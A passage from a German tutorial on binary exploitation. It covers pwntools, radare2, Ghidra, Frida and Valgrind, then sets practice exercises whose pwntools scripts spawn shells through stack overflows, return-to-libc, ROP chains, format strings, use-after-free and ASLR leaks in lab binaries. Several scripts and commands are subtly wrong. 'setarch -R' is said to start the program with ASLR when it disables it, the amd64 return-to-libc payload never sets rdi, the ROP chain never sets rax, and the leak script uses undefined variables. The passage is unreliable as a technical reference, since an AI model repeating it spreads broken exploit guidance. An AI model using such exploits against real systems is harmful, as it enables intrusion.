print(one_gadget(libc))
```



### 5. Pwntools



#### Installation

```bash
pip install pwntools
```


#### Grundlegende Verwendung

```python
from pwn import *

# Kontext setzen
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

# ELF laden
e = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Prozess starten
p = process('./vulnerable')
# Oder Remote
# p = remote('example.com', 1337)

# Payload senden
p.sendline(b'AAAA')

# Antwort empfangen
print(p.recvline())

# Interaktiv modus
p.interactive()

# Schließen
p.close()
```



#### Fortgeschrittene Features

```python
from pwn import *

# Format-String Exploit
e = ELF('./format_vuln')

# Adresse finden
secret_addr = e.symbols['secret']

# Format-String bauen
payload = fmtstr_payload(6, {secret_addr: 0x41414141})

p = process('./format_vuln')
p.sendline(payload)
p.interactive()

# ROP-Kette erstellen
rop = ROP(e)
rop.call(e.symbols['read'], [0, e.bss(), 100])
rop.call(e.symbols['puts'], [e.bss()])
rop.call('system', [e.bss()])

payload = b'A' * 72 + rop.chain()
```



### 6. Radare2 für Reverse Engineering



#### Installation

```bash
sudo apt install radare2
```


#### Grundlegende Befehle

```bash
# Programm analysieren
r2 -A ./programm

# Assembler anzeigen
[0x00000000]> pd 20        # 20 Instruktionen disassemblieren
[0x00000000]> pdf @ main   # main-Funktion disassemblieren

# Strings anzeigen
[0x00000000]> izz           # Alle Strings anzeigen
[0x00000000]> izz ~bin     # Strings mit "bin" filtern

# Funktion finden
[0x00000000]> aaaa         # Alle Funktionen analysieren
[0x00000000]> afl          # Funktionen anzeigen
[0x00000000]> s main       # Zur main-Funktion springen

# Register anzeigen
[0x00000000]> drr          # Alle Register anzeigen

# Speicher anzeigen
[0x00000000]> px 20 @ rsp  # 20 Bytes ab rsp anzeigen

# Breakpoint setzen
[0x00000000]> db 0x401136  # Breakpoint bei Adresse
[0x00000000]> db main      # Breakpoint bei main

# Programm ausführen
[0x00000000]> dc           # Continue
[0x00000000]> ds           # Step
[0x00000000]> dso          # Step over

# Verschiedene Ansichten
[0x00000000]> pD 20 @ main  # Disassemblieren
[0x00000000]> px 20 @ rsp  # Hex-Dump
[0x00000000]> pss @ rsp   # Strings anzeigen
```



#### Fortgeschrittene Analyse

```bash
# Cross-References anzeigen
[0x00000000]> axt @ sym.main  # Wer ruft main auf?
[0x00000000]> axf @ 0x401136 # Wer ruft diese Adresse auf?

# Funktion Called by
[0x00000000]> aac main       # Alle Aufrufe von main

# Call Graph
[0x00000000]> agCD main     # Call Graph für main

# Entropie (für Shellcode-Erkennung)
[0x00000000]> aeim         # Entropie aller Sections

# Signatur basierte Analyse
[0x00000000]> aza           # Signaturen erkennen
```



### 7. Ghidra (NSA Reverse Engineering Tool)



#### Installation

```bash
# Download von https://ghidra-sre.org/
# Oder auf Kali Linux:
sudo apt install ghidra
```


#### Grundlegende Verwendung

1. Ghidra starten
2. Projekt erstellen
3. Binärdatei importieren
4. Auto-Analyse durchführen
5. Funktion `main` öffnen



#### Nützliches

- **Decompiler**: C-ähnlicher Code aus Assembler
- **Cross-References**: Wer ruft diese Funktion auf?
- **Function Graph**: Visueller Call-Graph
- **Strings**: Alle Strings in der Binärdatei
- **Symbols**: Importierte/exportierte Funktionen



### 8. Frida (Dynamic Instrumentation)



#### Installation

```bash
pip install frida-tools
```


#### Grundlegende Verwendung

```javascript
// script.js
Interceptor.attach(Module.findExportByName(null, 'strcpy'), {
    onEnter: function(args) {
        console.log('strcpy called!');
        console.log('src: ' + args[0]);
        console.log('dst: ' + args[1]);
    },
    onLeave: function(retval) {
        console.log('strcpy returned: ' + retval);
    }
});
```

**Ausführen:**
```bash
frida -l script.js ./programm
```



#### Anwendungsfälle

- **Function Hooking**: Funktionen abfangen und manipulieren
- **Memory Read/Write**: Speicher während der Ausführung lesen/schreiben
- **Register manipulieren**: Registerwerte vor/nach Funktionen ändern
- **Syscall Monitoring**: Systemaufrufe überwachen



### 9. Valgrind (Memory Error Detection)



#### Installation

```bash
sudo apt install valgrind
```


#### Grundlegende Verwendung

```bash
# Alle Memory-Fehler prüfen
valgrind ./programm

# Mit Leak-Check
valgrind --leak-check=full ./programm

# Mit Details
valgrind --verbose ./programm

# Nur bestimmte Fehler
valgrind --error-exitcode=1 ./programm
```



#### Beispielausgabe

```
==12345== Memcheck, a memory error detector
==12345== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
==12345== Using Valgrind-3.13.0 and LibVEX; rerun with -h for copyright info
==12345== Command: ./programm
==12345== 
==12345== Invalid read of size 4
==12345==    at 0x401136: main (vulnerable.c:5)
==12345==  Address 0x5204068 is 0 bytes inside a block of size 64 free'd
==12345==    at 0x483E7AB: free (in /usr/lib/x86_64-linux-gnu/valgrind/vgpreload_memcheck-amd64-linux.so)
==12345==    by 0x40112A: main (vulnerable.c:4)
```



---



## 🎯 Teil 5: Praktische Übungen



### Übung 1: Stack-Based Buffer Overflow

**Ziel:** Exploitieren eines Stack-Overflows, um eine Shell zu starten.

**Schritte:**
1. Programm kompilieren (ohne Schutzmechanismen):
   ```bash
   gcc -fno-stack-protector -z execstack -no-pie vulnerable.c -o vulnerable
   ```
2. Offset zur Rücksprungadresse finden:
   ```bash
   gdb ./vulnerable
   (gdb) run $(python -c "from pwn import *; print(cyclic(200))")
   (gdb) x/i $rsp
   (gdb) pattern offset $rsp
   ```
3. Shellcode-Adresse finden:
   ```bash
   objdump -d ./vulnerable | grep -A10 "shellcode:"
   ```
4. Exploit schreiben:
   ```python
   from pwn import *
   
   p = process('./vulnerable')
   
   offset = 72  # Beispiel
   shellcode_addr = 0x401136  # Beispiel
   
   payload = b'A' * offset + p64(shellcode_addr)
   p.sendline(payload)
   p.interactive()
   ```



### Übung 2: Return-to-libc

**Ziel:** Exploitieren eines Buffer-Overflows mit Return-to-libc (NX aktiviert).

**Schritte:**
1. Programm kompilieren (mit NX):
   ```bash
   gcc -fno-stack-protector -z noexecstack vulnerable.c -o vulnerable
   ```
2. Adressen finden:
   ```bash
   gdb ./vulnerable
   (gdb) p system
   (gdb) p exit
   (gdb) find /lib/x86_64-linux-gnu/libc.so.6, 0, "/bin/sh"
   ```
3. Exploit schreiben:
   ```python
   from pwn import *
   
   p = process('./vulnerable')
   
   offset = 72
   system_addr = 0x7ffff7a5e520  # Beispiel
   binsh_addr = 0x7ffff7f8d5ec   # Beispiel
   
   payload = b'A' * offset
   payload += p64(system_addr)
   payload += p64(binsh_addr)
   payload += p64(0)  # NULL (argv)
   payload += p64(0)  # NULL (envp)
   
   p.sendline(payload)
   p.interactive()
   ```



### Übung 3: ROP-Kette erstellen

**Ziel:** Eine ROP-Kette erstellen, um `execve("/bin/sh")` aufzurufen.

**Schritte:**
1. Gadgets finden:
   ```bash
   ROPgadget --binary vulnerable > gadgets.txt
   ```
2. Gadgets auswählen:
   - `pop rdi; ret`
   - `pop rsi; ret`
   - `pop rdx; ret`
   - Adresse von `/bin/sh`
   - `syscall` oder `execve`
3. ROP-Kette bauen:
   ```python
   from pwn import *
   
   p = process('./vulnerable')
   e = ELF('./vulnerable')
   
   # Gadgets
   pop_rdi = 0x4007c3
   pop_rsi = 0x4007c1
   pop_rdx = 0x4007b5
   syscall = 0x400530
   binsh_addr = 0x601050
   
   rop = ROP(e)
   rop.raw(pop_rdi)
   rop.raw(binsh_addr)      # rdi = "/bin/sh"
   rop.raw(pop_rsi)
   rop.raw(0)               # rsi = NULL (argv)
   rop.raw(0)               # Dummy für pop r15
   rop.raw(pop_rdx)
   rop.raw(0)               # rdx = NULL (envp)
   rop.raw(59)              # rax = 59 (execve)
   rop.raw(syscall)         # syscall
   
   payload = b'A' * 72 + rop.chain()
   p.sendline(payload)
   p.interactive()
   ```



### Übung 4: Format-String Exploit

**Ziel:** Arbitrary Write mit `%n` durchführen.

**Schritte:**
1. Offset finden:
   ```bash
   ./format_vuln "%p %p %p %p"
   ```
2. Zieladresse finden:
   ```bash
   gdb ./format_vuln
   (gdb) p &target
   ```
3. Exploit schreiben:
   ```python
   from pwn import *
   
   p = process('./format_vuln')
   
   target_addr = 0xbffff7c0  # Beispiel
   
   # Format-String: Adresse + %<offset>$n
   payload = p32(target_addr) + b'%10x%1$n'
   
   p.sendline(payload)
   p.interactive()
   ```



### Übung 5: Heap Exploit (Use-After-Free)

**Ziel:** Use-After-Free ausnutzen, um Code auszuführen.

**Schritte:**
1. Programm analysieren (mit Heap-Overview in GDB/GEF)
2. Use-After-Free identifizieren
3. Exploit schreiben:
   ```python
   from pwn import *
   
   p = process('./heap_vulnerable')
   
   # Erste Allokation
   p.sendline(b'malloc 32')
   p.sendline(b'write 0 /bin/sh\x00')
   
   # Freigeben
   p.sendline(b'free 0')
   
   # Zweite Allokation (gleiche Größe)
   p.sendline(b'malloc 32')
   p.sendline(b'write 0 AAAA')
   
   # Jetzt enthält die erste Allokation "AAAA"
   # Wenn wir die Function Pointer überschen...
   # (Abhängig vom spezifischen Programm)
   
   p.interactive()
   ```



### Übung 6: ASLR Bypass mit Adressleak

**Ziel:** ASLR umgehen, indem man Adressen ausleakt.

**Schritte:**
1. Programm mit ASLR starten:
   ```bash
   setarch $(uname -m) -R ./vulnerable
   ```
2. Adresse leaken:
   ```python
   from pwn import *
   
   p = process('./vulnerable')
   
   # Function-Adresse leaken
   payload = b'%p.' * 20
   p.sendline(payload)
   leak = p.recvline()
   
   # libc-Basisadresse berechnen
   libc_base = int(leak.split('.')[5], 16) - libc.symbols['puts']
   system_addr = libc_base + libc.symbols['system']
   
   # Jetzt können wir system aufrufen
   payload2 = b'A' * 72 + p64(system_addr) + p64(binsh_addr)
   p.sendline(payload2)
   p.interactive()
   ```



---



## 📚 Ressourcen für Weiterbildung



### Bücher

- **[The Shellcoder's Handbook](https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X)** – Chris Anley et al.
- **[Hacking: The Art of Exploitation](https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erikson/dp/1593271441)** – Jon Erickson
- **[Practical Malware Analysis](https://www.amazon.com/Practical-Malware-Analysis-Dissecting-Engineering/dp/1593272908)** – Michael Sikorski, Andrew Honig
- **[Linux Binary Analysis](https://www.amazon.com/Linux-Binary-Analysis-Ryan-ONeill/dp/178017376X)** – Ryan O'Neill
- **[The IDA Pro Book](https://www.amazon.com/IDA-Pro-Book-Disassembler/dp/1593272896)** – Chris Eagle



### Online-Kurse

- **[Pwnable.kr](https://pwnable.kr/)** – Praktische CTF-Challenges
- **[OverTheWire: Bandit](https://overthewire.org/wargames/bandit/)** – Einstieg in Sicherheit
- **[Microcorruption](https://microcorruption.com/)** – Assembler-Challenges
- **[LiveOverflow](https://liveoverflow.com/)** – Binary Exploitation Tutorials
- **[Exploit Education: Phoenix](https://exploit.education/phoenix/)** – Buffer Overflow Challenges
- **[Pwn College](https://pwn.college/)** – Moderne Exploit-Entwicklung



### CTF-Plattformen

- **[CTFtime](https://ctftime.org/)** – CTF-Wettbewerbe
- **[Hack The Box](https://www.hackthebox.com/)** – Penetration Testing Labs
- **[TryHackMe](https://tryhackme.com/)** – Lernplattform
- **[picoCTF](https://picoctf.org/)** – Einsteigerfreundliche Challenges
- **[Root Me](https://www.root-me.org/)** – Französische CTF-Plattform



### Tools

- **[pwntools](https://github.com/Gallopsled/pwntools)** – Python-Bibliothek für Exploits
- **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)** – Gadget-Finder
- **[one_gadget](https://github.com/david942j/one_gadget)** – One-Gadget-Finder
- **[checksec](https://github.com/slimm609/checksec.sh)** – Sicherheitschecks
- **[GDB](https://www.gnu.org/software/gdb/)** – Debugger
- **[Ghidra](https://ghidra-sre.org/)** – Reverse Engineering Tool
- **[Radare2](https://www.radare.org/)** – Binary Analysis Framework
- **[Frida](https://frida.re/)** – Dynamic Instrumentation
- **[Valgrind](https://valgrind.org/)** – Memory Error Detection
- **[Binary Ninja](https://binary.ninja/)** – Kommerzieller Disassembler



### YouTube-Kanäle

- **[LiveOverflow](https://www.youtube.com/c/LiveOverflow)** – Binary Exploitation
- **[Guided Hacking](https://www.youtube.com/c/GuidedHacking)** – Sicherheitstutorials
- **[IppSec](https://www.youtube.com/c/ippsec)** – Hack The Box Walkthroughs
- **[The Cyber Mentor](https://www.youtube.com/c/TheCyberMentor)** – Ethical Hacking
- **[OALabs](https://www.youtube.com/c/OALabs)** – Reverse Engineering



---



## 🎯 Zusammenfassung: Was du jetzt können solltest


| Fähigkeit | Beschreibung |
|-----------|--------------|
| ✅ **Buffer Overflow erkennen** | Stack-Overflows in Code finden |
| ✅ **Offsets berechnen** | Distanz zur Rücksprungadresse bestimmen |
| ✅ **Shellcode schreiben** | Einfache Payloads in Assembler erstellen |
| ✅ **Return-to-libc** | Bestehende Funktionen für Exploits nutzen |
| ✅ **ROP-Ketten bauen** | Gadgets kombinieren für komplexe Angriffe |
| ✅ **Format-String Angriffe** | Speicher lesen/schreiben mit Format-Strings |
| ✅ **Heap-Exploits** | Use-After-Free und ähnliche Angriffe |
| ✅ **Schutzmechanismen verstehen** | ASLR, NX, Canaries, PIE, RELRO |
| ✅ **Schutzmechanismen umgehen** | Adressleaks, Brute Force, Alternative Techniken |
| ✅ **GDB nutzen** | Debugging und Exploit-Entwicklung |
| ✅ **pwntools verwenden** | Automatisierte Exploit-Entwicklung |
| ✅ **Radare2/Ghidra nutzen** | Reverse Engineering von Binaries |



### Nächste Schritte:
1. **Übungen machen** auf [pwnable.kr](https://pwnable.kr/) oder [Pwn College](https://pwn.college/)
2. **CTFs teilnehmen** auf [CTFtime](https://ctftime.org/)
3. **Eigene Exploits schreiben** für vulnerable Programme
4. **Sicherheitsforschung betreiben** – neue Exploit-Techniken lernen
5. **Bug Bounty Programme** – Sicherheitslücken in echten Programmen finden



---



## 🔗 Verwandte Themen



- [Assembler](assembler.md) – Grundlagen der Assembler-Programmierung
- [Compiler](compiler.md) – Wie Code zu Assembler wird
- [Rust, C & C++ Integration](rust-c-cpp-integration.md) – Sprachübergreifende Programmierung
- [Linux-Systemprogrammierung](linux-systemprogrammierung.md) – System Calls und Kernel-Interaktion



---



*Letzte Aktualisierung: {{ git_revision_date_localized() }}*
